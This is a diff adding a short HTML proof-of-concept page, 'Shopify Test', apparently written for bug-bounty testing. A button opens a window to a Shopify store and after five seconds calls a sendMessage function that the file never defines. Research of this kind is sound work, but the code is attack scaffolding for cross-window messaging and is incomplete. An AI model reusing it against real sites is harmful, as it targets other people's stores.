@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Shopify Test</title>
+</head>
+<body style = "text-align: center">
+    <h1>Shopify Test</h1>
+    <button id="openAli">Click here to trigger the PoC</button>
+    <script>
+        var aliWin;
+
+        function openWin(){
+            aliWin = window.open("https://hackingyou123.myshopify.com/");
+            setTimeout(sendMessage,5000)
+            //aliwin.setInterval(20000)
+        }
+
+        document.getElementById("openAli").addEventListener('click', openWin);
+    </script>
+</body>
+</html>
